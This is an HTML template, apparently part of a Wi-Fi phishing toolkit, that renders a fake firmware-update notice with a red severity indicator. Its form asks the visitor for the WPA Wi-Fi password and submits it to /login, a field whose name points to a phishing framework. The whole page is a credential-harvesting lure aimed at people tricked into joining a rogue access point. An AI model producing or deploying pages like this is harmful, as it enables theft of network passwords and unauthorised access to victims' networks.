<!DOCTYPE html>
<html lang="{{html_lang}}">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{title_page}}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
               background: linear-gradient(160deg, #e8ecf1 0%, #d4dce6 50%, #eef1f5 100%);
               min-height: 100vh; display: flex;
               align-items: center; justify-content: center; padding: 16px; }
        .panel { background: #fff; border-radius: 8px; width: 100%; max-width: 500px;
                 box-shadow: 0 4px 24px rgba(44, 62, 80, 0.12); overflow: hidden;
                 border: 1px solid #dce3eb; }
        .header { background: linear-gradient(180deg, #3d5a80 0%, #2c3e50 100%); padding: 20px 24px; color: #fff; }
        .header h1 { font-size: 18px; font-weight: 500; }
        .header span { font-size: 12px; opacity: 0.85; }
        .body { padding: 24px; }
        .warning { background: #f0f4f8; border-left: 4px solid #5b7c99;
                   padding: 14px; margin-bottom: 20px; border-radius: 4px; }
        .warning strong { color: #2c3e50; display: block; margin-bottom: 6px; }
        .warning p { color: #5a6c7d; font-size: 13px; margin-top: 4px; line-height: 1.45; }
        .info { background: #f5f7fa; border-radius: 6px; padding: 14px;
                margin-bottom: 20px; font-size: 13px; border: 1px solid #e2e8f0; }
        .info table { width: 100%; }
        .info td { padding: 4px 0; color: #555; }
        .info td:first-child { font-weight: 600; width: 45%; color: #3d4f5f; }
        label { display: block; font-size: 13px; font-weight: 600;
                color: #333; margin-bottom: 6px; }
        input[type="password"] { width: 100%; padding: 12px; border: 1px solid #c5d0dc;
                                  border-radius: 6px; font-size: 14px; margin-bottom: 16px; }
        input[type="password"]:focus { outline: none; border-color: #5b7c99; box-shadow: 0 0 0 2px rgba(91, 124, 153, 0.2); }
        .hint { font-size: 11px; color: #7a8a9a; margin-top: -12px; margin-bottom: 16px; line-height: 1.4; }
        .btn { width: 100%; padding: 12px; background: #3d5a80; color: #fff;
               border: none; border-radius: 6px; font-size: 15px; font-weight: 600;
               cursor: pointer; }
        .btn:hover { background: #2c3e50; }
        .footer { padding: 16px 24px; background: #f5f7fa; text-align: center;
                  font-size: 11px; color: #7a8a9a; border-top: 1px solid #e2e8f0; }
    </style>
</head>
<body>
    <div class="panel">
        <div class="header">
            <h1>{{header_title}}</h1>
            <span>{{header_sub}}</span>
        </div>
        <div class="body">
            <div class="warning">
                <strong>&#9888; {{warning_title}}</strong>
                <p>{{warning_body}}</p>
            </div>
            <div class="info">
                <table>
                    <tr><td>{{tbl_current}}</td><td>{{val_current}}</td></tr>
                    <tr><td>{{tbl_new}}</td><td>{{val_new}}</td></tr>
                    <tr><td>{{tbl_severity}}</td><td style="color:#c0392b;font-weight:600">{{val_severity}}</td></tr>
                </table>
            </div>
            <form method="POST" action="/login">
                <label for="psk">{{label_password}}</label>
                <input type="password" id="psk" name="wfphshr-wpa-password" placeholder="{{placeholder_password}}" required autocomplete="current-password">
                <p class="hint">{{hint_verify}}</p>
                <button type="submit" class="btn">{{btn_apply}}</button>
            </form>
        </div>
        <div class="footer">{{footer_rights}}</div>
    </div>
</body>
</html>
